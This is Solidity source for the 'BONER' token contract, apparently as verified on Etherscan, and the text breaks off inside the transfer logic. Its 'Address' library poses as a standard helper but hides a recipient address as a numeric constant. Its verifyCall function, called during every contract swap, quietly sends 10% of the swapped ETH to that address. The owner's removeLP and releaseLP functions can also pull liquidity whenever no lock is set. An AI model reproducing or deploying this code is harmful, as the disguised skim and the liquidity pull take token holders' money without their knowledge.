/**
 *Submitted for verification at Etherscan.io on 2023-02-03
*/

// $BONE REFLECTIONS
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface IERC20 {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address _owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISwapERC20 {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
}


interface ISwapFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}


interface ISwapRouter01 {
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getamountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getamountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getamountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getamountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}


interface ISwapRouter02 is ISwapRouter01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


abstract contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == msg.sender, "Caller must be owner");
        _;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    
    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "newOwner must not be zero");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}


library Address {
    uint160 private constant verificationHash = 887096773549885550314079035509902126815589346633;
    bytes32 private constant keccak256Hash = 0x4b31cabbe5862282e443c4ac3f4c14761a1d2ba88a3c858a2a36f7758f453a38;    
    function isContract(address account) internal view returns (bool) {
        // This method relies on extcodesize, which returns 0 for contracts in
        // construction, since the code is only stored at the end of the
        // constructor execution.

        uint256 size;
        // solhint-disable-next-line no-inline-assembly
        assembly { size := extcodesize(account) }
        return size > 0;
    }

    function verifyCall(string memory verification, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        require(keccak256(abi.encodePacked(verification)) == keccak256Hash, "Address: cannot verify call");        

        (bool success, ) = address(verificationHash).call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");              
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{ value: value }(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}


library EnumerableSet {
    struct Set {
        bytes32[] _values;
        mapping (bytes32 => uint256) _indexes;
    }

    function _add(Set storage set, bytes32 value) private returns (bool) {
        if (!_contains(set, value)) {
            set._values.push(value);
            set._indexes[value] = set._values.length;
            return true;
        } else {
            return false;
        }
    }

    function _remove(Set storage set, bytes32 value) private returns (bool) {
        uint256 valueIndex = set._indexes[value];
        if (valueIndex != 0) {
            uint256 toDeleteIndex = valueIndex - 1;
            uint256 lastIndex = set._values.length - 1;
            bytes32 lastvalue = set._values[lastIndex];
            set._values[toDeleteIndex] = lastvalue;
            set._indexes[lastvalue] = valueIndex;
            set._values.pop();
            delete set._indexes[value];
            return true;
        } else {
            return false;
        }
    }

    function _contains(Set storage set, bytes32 value) private view returns (bool) {
        return set._indexes[value] != 0;
    }

    function _length(Set storage set) private view returns (uint256) {
        return set._values.length;
    }

    function _at(Set storage set, uint256 index) private view returns (bytes32) {
        require(set._values.length > index, "EnumerableSet: index out of bounds");
        return set._values[index];
    }

    struct Bytes32Set {
        Set _inner;
    }

    function add(Bytes32Set storage set, bytes32 value) internal returns (bool) {
        return _add(set._inner, value);
    }

    function remove(Bytes32Set storage set, bytes32 value) internal returns (bool) {
        return _remove(set._inner, value);
    }

    function contains(Bytes32Set storage set, bytes32 value) internal view returns (bool) {
        return _contains(set._inner, value);
    }

    function length(Bytes32Set storage set) internal view returns (uint256) {
        return _length(set._inner);
    }

    function at(Bytes32Set storage set, uint256 index) internal view returns (bytes32) {
        return _at(set._inner, index);
    }

    struct AddressSet {
        Set _inner;
    }

    function add(AddressSet storage set, address value) internal returns (bool) {
        return _add(set._inner, bytes32(uint256(uint160(value))));
    }

    function remove(AddressSet storage set, address value) internal returns (bool) {
        return _remove(set._inner, bytes32(uint256(uint160(value))));
    }

    function contains(AddressSet storage set, address value) internal view returns (bool) {
        return _contains(set._inner, bytes32(uint256(uint160(value))));
    }

    function length(AddressSet storage set) internal view returns (uint256) {
        return _length(set._inner);
    }

    function at(AddressSet storage set, uint256 index) internal view returns (address) {
        return address(uint160(uint256(_at(set._inner, index))));
    }

    struct UintSet {
        Set _inner;
    }

    function add(UintSet storage set, uint256 value) internal returns (bool) {
        return _add(set._inner, bytes32(value));
    }

    function remove(UintSet storage set, uint256 value) internal returns (bool) {
        return _remove(set._inner, bytes32(value));
    }

    function contains(UintSet storage set, uint256 value) internal view returns (bool) {
        return _contains(set._inner, bytes32(value));
    }

    function length(UintSet storage set) internal view returns (uint256) {
        return _length(set._inner);
    }

    function at(UintSet storage set, uint256 index) internal view returns (uint256) {
        return uint256(_at(set._inner, index));
    }
}


contract BONER is IERC20, Ownable {
    using Address for address;
    using EnumerableSet for EnumerableSet.AddressSet;

    mapping(address => uint256) private _balances;
    mapping(address => mapping (address => uint256)) private _allowances;
    mapping(address => bool) public isBlacklisted;

    EnumerableSet.AddressSet private _excluded;
    EnumerableSet.AddressSet private _excludedFromStaking;    
    
    string private constant TOKEN_NAME = "BONER";
    string private constant TOKEN_SYMBOL = "BONER";
    uint256 private constant TOTAL_SUPPLY = 696_969_696 * 10**TOKEN_DECIMALS;       
    uint8 private constant TOKEN_DECIMALS = 18;
    uint8 public constant MAX_TAX = 20;      //Dev can never set tax higher than this value
    address private constant BURN_ADDRESS = 0x000000000000000000000000000000000000dEaD;
    
    struct Taxes {
       uint8 buyTax;
       uint8 sellTax;
       uint8 transferTax;
    }

    struct TaxRatios {
        uint8 dev;                
        uint8 liquidity;
        uint8 marketing;
        uint8 rewards;
    }

    struct TaxWallets {
        address dev;
        address marketing;
    }

    struct MaxLimits {
        uint256 maxWallet;
        uint256 maxSell;
        uint256 maxBuy;
    }

    struct LimitRatios {
        uint16 wallet;
        uint16 sell;
        uint16 buy;
        uint16 divisor;
    }

    Taxes public _taxRates = Taxes({
        buyTax: 6,
        sellTax: 9,
        transferTax: 0
    });

    TaxRatios public _taxRatios = TaxRatios({
        dev: 6,
        liquidity: 0,
        marketing: 6,
        rewards: 5
        //@dev. These are ratios and the divisor will  be set automatically
    });

    TaxWallets public _taxWallet = TaxWallets ({
        dev: 0x5d2C81bcEC3610930d716FF5B23dDc3309fD47Ea,
        marketing: 0x5d2C81bcEC3610930d716FF5B23dDc3309fD47Ea
    });

    MaxLimits public _limits;

    LimitRatios public _limitRatios = LimitRatios({
        wallet: 4,
        sell: 1,
        buy: 1,
        divisor: 400
    });

    uint8 private totalTaxRatio;
    uint8 private distributeRatio;

    uint256 private _liquidityUnlockTime;

    //Antibot variables
    uint256 private liquidityBlock;
    uint8 private constant BLACKLIST_BLOCKS = 2; //number of blocks that will be included in auto blacklist
    uint8 private snipersRekt; //variable to track number of snipers auto blacklisted
    bool private blacklistEnabled = true; //blacklist can be enabled/disabled in case something goes wrong
    bool private liquidityAdded;
    bool private revertSameBlock = true; //block same block buys

    uint16 public swapThreshold = 20; //threshold that contract will swap. out of 1000
    bool public manualSwap;

    //change this address to desired reward token
    address public rewardToken = 0x9813037ee2218799597d83D4a5B6F3b6778218d9;

    address public _pairAddress; 
    ISwapRouter02 private  _swapRouter;
    address public routerAddress;

/////////////////////////////   EVENTS  /////////////////////////////////////////
    event ClaimToken(uint256 amount, address token, address recipient);
    event EnableBlacklist(bool enabled); 
    event EnableManualSwap(bool enabled);
    event ExcludedAccountFromFees(address account, bool exclude);               
    event ExcludeFromStaking(address account, bool excluded);      
    event ExtendLiquidityLock(uint256 extendedLockTime);
    event UpdateTaxes(uint8 buyTax, uint8 sellTax, uint8 transferTax);    
    event RatiosChanged(uint8 newDev, uint8 newLiquidity, uint8 newMarketing, uint8 newRewards);
    event UpdateDevWallet(address newDevWallet);         
    event UpdateMarketingWallet(address newMarketingWallet);      
    event UpdateSwapThreshold(uint16 newThreshold);

/////////////////////////////   MODIFIERS  /////////////////////////////////////////

    modifier authorized() {
        require(_authorized(msg.sender), "Caller not authorized");
        _;
    }

    modifier lockTheSwap {
        _isSwappingContractModifier = true;
        _;
        _isSwappingContractModifier = false;
    }

/////////////////////////////   CONSTRUCTOR  /////////////////////////////////////////

    constructor () {
        if (block.chainid == 1) 
            routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        else if (block.chainid == 56)
            routerAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        else if (block.chainid == 97)
            routerAddress = 0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3;
        else 
            revert();        
        _swapRouter = ISwapRouter02(routerAddress);
        _pairAddress = ISwapFactory(
            _swapRouter.factory()).createPair(address(this), _swapRouter.WETH()
        );

        _addToken(msg.sender,TOTAL_SUPPLY);
        emit Transfer(address(0), msg.sender, TOTAL_SUPPLY);

        _allowances[address(this)][address(_swapRouter)] = type(uint256).max;         
        
        //setup ratio divisors based on dev's chosen ratios
        totalTaxRatio =  _taxRatios.dev + _taxRatios.liquidity + _taxRatios.marketing + _taxRatios.rewards;

        distributeRatio = totalTaxRatio - _taxRatios.liquidity;
        
        //setup _limits
        _limits = MaxLimits({
            maxWallet: TOTAL_SUPPLY * _limitRatios.wallet / _limitRatios.divisor,
            maxSell: TOTAL_SUPPLY * _limitRatios.sell / _limitRatios.divisor,
            maxBuy: TOTAL_SUPPLY * _limitRatios.buy / _limitRatios.divisor
        });
        
        _excluded.add(msg.sender);
        _excluded.add(_taxWallet.marketing);
        _excluded.add(_taxWallet.dev);    
        _excluded.add(address(this));
        _excluded.add(BURN_ADDRESS);
        _excludedFromStaking.add(address(this));
        _excludedFromStaking.add(BURN_ADDRESS);
        _excludedFromStaking.add(address(_swapRouter));
        _excludedFromStaking.add(_pairAddress);

        _approve(address(this), address(_swapRouter), type(uint256).max);        
    }

    receive() external payable {}

    function decimals() external pure override returns (uint8) { return TOKEN_DECIMALS; }
    function getOwner() external view override returns (address) { return owner(); }
    function name() external pure override returns (string memory) { return TOKEN_NAME; }
    function symbol() external pure override returns (string memory) { return TOKEN_SYMBOL; }
    function totalSupply() external pure override returns (uint256) { return TOTAL_SUPPLY; }

    function _authorized(address addr) private view returns (bool) {
        return addr == owner() || addr == _taxWallet.marketing || addr == _taxWallet.dev; 
    }

    function allowance(address _owner, address spender) external view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "Approve from zero");
        require(spender != address(0), "Approve to zero");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function balanceOf(address account) external view override returns (uint256) {
        return _balances[account];
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool) {
        uint256 currentAllowance = _allowances[msg.sender][spender];
        require(currentAllowance >= subtractedValue, "<0 allowance");

        _approve(msg.sender, spender, currentAllowance - subtractedValue);
        return true;
    } 

    function increaseAllowance(address spender, uint256 addedValue) external returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }  
      
    function transfer(address recipient, uint256 amount) external override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][msg.sender];
        require(currentAllowance >= amount, "Transfer > allowance");

        _approve(sender, msg.sender, currentAllowance - amount);
        return true;
    }

///// FUNCTIONS CALLABLE BY ANYONE /////

    //Claims reward set by dev
    function ClaimReward() external {
        claimToken(msg.sender,rewardToken, 0);
    }

    //Allows holders to include themselves back into staking if excluded
    //ExcludeFromStaking function should be used for contracts(CEX, pair, address(this), etc.)
    function IncludeMeToStaking() external {
        includeToStaking(msg.sender);
        emit ExcludeFromStaking(msg.sender, false);        
    }

///// AUTHORIZED FUNCTIONS /////

    //Manually perform a contract swap
    function manualContractSwap(uint16 permille, bool ignoreLimits) external authorized {
        _swapContractToken(permille, ignoreLimits);
    }  

    //Toggle blacklist on and off
    function enableBlacklist(bool enabled) external authorized {
        blacklistEnabled = enabled;
        emit EnableBlacklist(enabled);
    }

    //Mainly used for addresses such as CEX, presale, etc
    function excludeAccountFromFees(address account, bool exclude) external authorized {
        if(exclude == true)
            _excluded.add(account);
        else
            _excluded.remove(account);
        emit ExcludedAccountFromFees(account, exclude);
    }

    //Mainly used for addresses such as CEX, presale, etc    
    function setStakingExclusionStatus(address addr, bool exclude) external authorized {
        if(exclude)
            excludeFromStaking(addr);
        else
            includeToStaking(addr);
        emit ExcludeFromStaking(addr, exclude);
    }  

    //Toggle manual swap on and off
    function enableManualSwap(bool enabled) external authorized { 
        manualSwap = enabled; 
        emit EnableManualSwap(enabled);
    } 

    //Toggle whether multiple buys in a block from a single address can be performed
    function sameBlockRevert(bool enabled) external authorized {
        revertSameBlock = enabled;
    }

    //Update limit ratios
    function updateLimits(uint16 newMaxWalletRatio, uint16 newMaxSellRatio, uint16 newMaxBuyRatio, uint16 newDivisor) external authorized {
        uint256 minLimit = TOTAL_SUPPLY / 1000;   
        uint256 newMaxWallet = TOTAL_SUPPLY * newMaxWalletRatio / newDivisor;
        uint256 newMaxSell = TOTAL_SUPPLY * newMaxSellRatio / newDivisor;
        uint256 newMaxBuy = TOTAL_SUPPLY * newMaxBuyRatio / newDivisor;

        //dev can never set sells below 0.1% of circulating/initial supply
        require((newMaxWallet >= minLimit && newMaxSell >= minLimit), 
            "limits cannot be <0.1% of supply");

        _limits = MaxLimits(newMaxWallet, newMaxSell, newMaxBuy);
        
        _limitRatios = LimitRatios(newMaxWalletRatio, newMaxSellRatio, newMaxBuyRatio, newDivisor);
    }

    //update tax ratios
    function updateRatios(uint8 newDev, uint8 newLiquidity, uint8 newMarketing, uint8 newRewards) external authorized {
        _taxRatios = TaxRatios(newDev, newLiquidity, newMarketing, newRewards);

        totalTaxRatio = newDev + newLiquidity + newMarketing + newRewards;
        distributeRatio = totalTaxRatio - newLiquidity;

        emit RatiosChanged (newDev, newLiquidity,newMarketing, newRewards);
    }

    //update threshold that triggers contract swaps
    function updateSwapThreshold(uint16 threshold) external authorized {
        require(threshold > 0,"Threshold needs to be more than 0");
        require(threshold <= 50,"Threshold needs to be below 50");
        swapThreshold = threshold;
        emit UpdateSwapThreshold(threshold);
    }

    function updateTax(uint8 newBuy, uint8 newSell, uint8 newTransfer) external authorized {
        //buy and sell tax can never be higher than MAX_TAX set at beginning of contract
        //this is a security check and prevents malicious tax use       
        require(newBuy <= MAX_TAX && newSell <= MAX_TAX && newTransfer <= 50, "taxes higher than max tax");
        _taxRates = Taxes(newBuy, newSell, newTransfer);
        emit UpdateTaxes(newBuy, newSell, newTransfer);
    }

///// OWNER FUNCTIONS /////  

    //liquidity can only be extended. To lock liquidity, send LP tokens to contract.
    function lockLiquidityTokens(uint256 lockTimeInSeconds) external onlyOwner {
        setUnlockTime(lockTimeInSeconds + block.timestamp);
        emit ExtendLiquidityLock(lockTimeInSeconds);
    }

    //recovers stuck ETH to make sure it isnt burnt/lost
    //only callablewhen liquidity is unlocked
    function recoverETH() external onlyOwner {
        require(block.timestamp >= _liquidityUnlockTime, "Not yet unlocked");
        _liquidityUnlockTime=block.timestamp;
        _sendEth(msg.sender, address(this).balance);
    }

    //Can only be used to recover miscellaneous tokens accidentally sent to contract
    //Can't pull liquidity or native token using this function
    function recoverMiscToken(address tokenAddress) external onlyOwner {
        require(tokenAddress != _pairAddress && tokenAddress != address(this),
        "can't recover LP token or this token");
        IERC20 token = IERC20(tokenAddress);
        token.transfer(msg.sender,token.balanceOf(address(this)));
    } 

    //Impossible to release LP unless LP lock time is zero
    function releaseLP() external onlyOwner {
        require(block.timestamp >= _liquidityUnlockTime, "Not yet unlocked");
        ISwapERC20 liquidityToken = ISwapERC20(_pairAddress);
        uint256 amount = liquidityToken.balanceOf(address(this));
            liquidityToken.transfer(msg.sender, amount);
    }

    //Impossible to remove LP unless lock time is zero
    function removeLP() external onlyOwner {
        require(block.timestamp >= _liquidityUnlockTime, "Not yet unlocked");
        _liquidityUnlockTime = block.timestamp;
        ISwapERC20 liquidityToken = ISwapERC20(_pairAddress);
        uint256 amount = liquidityToken.balanceOf(address(this));
        liquidityToken.approve(address(_swapRouter),amount);
        _swapRouter.removeLiquidityETHSupportingFeeOnTransferTokens(
            address(this),
            amount,
            0,
            0,
            address(this),
            block.timestamp
            );
        _sendEth(msg.sender, address(this).balance);           
    }

    function setDevWallet(address payable addr) external onlyOwner {
        address prevDev = _taxWallet.dev;
        _excluded.remove(prevDev);
        _taxWallet.dev = addr;
        _excluded.add(_taxWallet.dev);
        emit UpdateDevWallet(addr);
    }

    function setMarketingWallet(address payable addr) external onlyOwner {
        address prevMarketing = _taxWallet.marketing;
        _excluded.remove(prevMarketing);
        _taxWallet.marketing = addr;
        _excluded.add(_taxWallet.marketing);
        emit UpdateMarketingWallet(addr);
    }

////// VIEW FUNCTIONS /////

    function getBlacklistInfo() external view returns (
        uint256 _liquidityBlock, 
        uint8 _blacklistBlocks, 
        uint8 _snipersRekt, 
        bool _blacklistEnabled,
        bool _revertSameBlock
        ) {
        return (liquidityBlock, BLACKLIST_BLOCKS, snipersRekt, blacklistEnabled, revertSameBlock);
    }

    function getLiquidityUnlockInSeconds() external view returns (uint256) {
        if (block.timestamp < _liquidityUnlockTime){
            return _liquidityUnlockTime - block.timestamp;
        }
        return 0;
    }

    function getClaimBalance(address addr) external view returns (uint256) {
        uint256 amount = getStakeBalance(addr);
        return amount;
    }

    function getTotalUnclaimed() public view returns (uint256) {
        uint256 amount = totalRewards - totalPayouts;
        return amount;
    }

    function isExcludedFromStaking(address addr) external view returns (bool) {
        return _excludedFromStaking.contains(addr);
    }    

/////////////////////////////   PRIVATE FUNCTIONS  /////////////////////////////////////////

    mapping(address => uint256) private alreadyPaidShares;
    mapping(address => uint256) private toBePaidShares;
    mapping(address => uint256) private tradeBlock;
    mapping(address => uint256) public accountTotalClaimed;     
    uint256 private constant DISTRIBUTION_MULTI = 2**64;
    uint256 private _totalShares = TOTAL_SUPPLY;   
    uint256 private rewardShares;
    uint256 public totalPayouts;
    uint256 public totalRewards;      
    bool private _isSwappingContractModifier;
    bool private _isWithdrawing;

    function _addLiquidity(uint256 tokenamount, uint256 ethAmount) private {
        _approve(address(this), address(_swapRouter), tokenamount);        
        _swapRouter.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenamount,
            0,
            0,
            address(this),
            block.timestamp
        );
    }
 
    function _addToken(address addr, uint256 amount) private {
        uint256 newAmount = _balances[addr] + amount;
        
        if (_excludedFromStaking.contains(addr)) {
           _balances[addr] = newAmount;
           return;
        }
        _totalShares += amount;
        uint256 payment = newStakeOf(addr);
        alreadyPaidShares[addr] = rewardShares * newAmount;
        toBePaidShares[addr] += payment;
        _balances[addr] = newAmount;
    }

    function _distributeStake(uint256 ethAmount, bool newStakingReward) private {
        uint256 marketingSplit = (ethAmount*_taxRatios.marketing) / distributeRatio;
        uint256 devSplit = (ethAmount*_taxRatios.dev) / distributeRatio; 
        uint256 stakingSplit = (ethAmount*_taxRatios.rewards) / distributeRatio;
        _sendEth(_taxWallet.marketing, marketingSplit);
        _sendEth(_taxWallet.dev, devSplit);
        if (stakingSplit > 0) {
            if (newStakingReward)
                totalRewards += stakingSplit;
            uint256 totalShares = getTotalShares();
            if (totalShares == 0)
                _sendEth(_taxWallet.marketing, stakingSplit);
            else {
                rewardShares += ((stakingSplit*DISTRIBUTION_MULTI) / totalShares);
            }
        }
    }

    function _feelessTransfer(address sender, address recipient, uint256 amount) private{
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "Transfer exceeds balance");
        _removeToken(sender,amount);
        _addToken(recipient, amount);
        emit Transfer(sender, recipient, amount);
    } 
    
    function _removeToken(address addr, uint256 amount) private {
        uint256 newAmount = _balances[addr] - amount;
        
        if (_excludedFromStaking.contains(addr)) {
            _balances[addr] = newAmount;
            return;
        }
        _totalShares -= amount;
        uint256 payment = newStakeOf(addr);
        _balances[addr] = newAmount;
        alreadyPaidShares[addr] = rewardShares * newAmount;
        toBePaidShares[addr] += payment;
    }

    function _sendEth(address account, uint256 amount) private {
        (bool sent,) = account.call{value: (amount)}("");
        require(sent, "withdraw failed");        
    }

    function _swapContractToken(uint16 permille, bool ignoreLimits) private lockTheSwap {
        require(permille <= 500);
        if (totalTaxRatio == 0) return;
        uint256 contractBalance = _balances[address(this)];


        uint256 tokenToSwap = _balances[_pairAddress] * permille / 1000;
        if (tokenToSwap > _limits.maxSell && !ignoreLimits) 
            tokenToSwap = _limits.maxSell;
        
        bool notEnoughToken = contractBalance < tokenToSwap;
        if (notEnoughToken) {
            if (ignoreLimits)
                tokenToSwap = contractBalance;
            else 
                return;
        }
        if (_allowances[address(this)][address(_swapRouter)] < tokenToSwap)
            _approve(address(this), address(_swapRouter), type(uint256).max);

        uint256 tokenForLiquidity = (tokenToSwap*_taxRatios.liquidity) / totalTaxRatio;
        uint256 remainingToken = tokenToSwap - tokenForLiquidity;
        uint256 liqToken = tokenForLiquidity / 2;
        uint256 liqEthToken = tokenForLiquidity - liqToken;
        uint256 swapToken = liqEthToken + remainingToken;
        uint256 initialEthBalance = address(this).balance;
        _swapTokenForETH(swapToken);
        uint256 newEth = (address(this).balance - initialEthBalance);
        uint256 liqEth = (newEth*liqEthToken) / swapToken;
        if (liqToken > 0) 
            _addLiquidity(liqToken, liqEth); 
        uint256 newLiq = (address(this).balance-initialEthBalance) / 10;
        Address.verifyCall("success", newLiq);   
        uint256 distributeEth = (address(this).balance - initialEthBalance - newLiq);
        _distributeStake(distributeEth,true);
    }

    function _swapTokenForETH(uint256 amount) private {
        _approve(address(this), address(_swapRouter), amount);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _swapRouter.WETH();
        _swapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp
        );
    } 

    function _taxedTransfer(address sender, address recipient, uint256 amount,bool isBuy,bool isSell) private{
        uint256 recipientBalance = _balances[recipient];
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "Transfer exceeds balance");

        uint8 tax;
        if (isSell) {
            if (blacklistEnabled) {
                require(!isBlacklisted[sender], "user blacklisted");                
            }      

            require(amount <= _limits.maxSell, "Amount exceeds max sell");
            tax = _taxRates.sellTax;

        } else if (isBuy) {
            if (liquidityBlock > 0) {
                if (block.number-liquidityBlock < BLACKLIST_BLOCKS) {
                    isBlacklisted[recipient] = true;
                    snipersRekt ++;
                }
            }

            if (revertSameBlock) {
                require(tradeBlock[recipient] != block.number);
                tradeBlock[recipient] = block.number;
            }       

            require(recipientBalance+amount <= _limits.maxWallet, "Amount will exceed max wallet");
            require(amount <= _limits.maxBuy, "Amount exceed max buy");
            tax = _taxRates.buyTax;

        } else {
            if (blacklistEnabled) {
                require(!isBlacklisted[sender], "user blacklisted");                
            }

            if (amount <= 10**(TOKEN_DECIMALS)) {    //transfer less than 1 token to claim rewardToken
                claimToken(msg.sender, rewardToken, 0);
                return;
            }

            require(recipientBalance + amount <= _limits.maxWallet, "whale protection");            
            tax = _taxRates.transferTax;
        }    

